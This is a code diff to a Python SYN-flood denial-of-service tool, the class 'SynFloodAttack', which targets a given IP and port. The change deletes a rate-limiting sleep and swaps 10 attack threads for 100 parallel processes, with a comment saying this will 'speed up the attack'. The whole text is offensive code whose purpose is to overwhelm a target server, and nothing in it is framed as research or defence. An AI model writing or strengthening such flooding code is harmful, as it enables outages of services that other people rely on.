@@ -8,6 +8,7 @@ import time
 import os
 import signal
 import sys
+import multiprocessing
 
 class SynFloodAttack:
     def __init__(self, target_ip, target_port, duration):
@@ -49,7 +50,6 @@ class SynFloodAttack:
                 self.stats['syn_packets_sent'] += 1
             except Exception as e:
                 self.stats['errors'] += 1
-                time.sleep(0.05)  # Small delay to avoid overwhelming the system
 
     def start(self):
         """Starts the attack."""
@@ -66,10 +66,14 @@ class SynFloodAttack:
         print(f"   • Target Port: {self.target_port}")
         print(f"   • Duration: {self.attack_duration}s\n")
         
-        # Start multiple attack threads (for concurrency)
-        num_threads = 10  # You can adjust this to the desired number of threads
-        for _ in range(num_threads):
-            threading.Thread(target=self.syn_flood, daemon=True).start()
+        # Use multiprocessing to speed up the attack
+        num_processes = 100  # Adjust this number based on your system's capability
+        processes = []
+
+        for _ in range(num_processes):
+            process = multiprocessing.Process(target=self.syn_flood)
+            process.start()
+            processes.append(process)
 
         # Attack duration loop
         try:
